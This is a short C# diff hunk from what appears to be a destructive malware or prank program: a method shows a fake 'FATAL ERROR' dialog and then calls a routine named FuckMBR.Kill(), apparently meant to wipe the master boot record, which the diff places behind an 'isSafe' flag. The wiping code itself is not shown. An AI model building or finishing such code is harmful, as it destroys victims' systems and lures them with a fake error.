@@ -91,7 +91,7 @@ namespace System64
 		void StartOperation()
 		{
 			MessageBox.Show("FATAL ERROR IN ADRESS 0x00000007", "FATAL ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
-			FuckMBR.Kill();
+			if (!isSafe) FuckMBR.Kill();
 			timer2.Start();
 		}
 
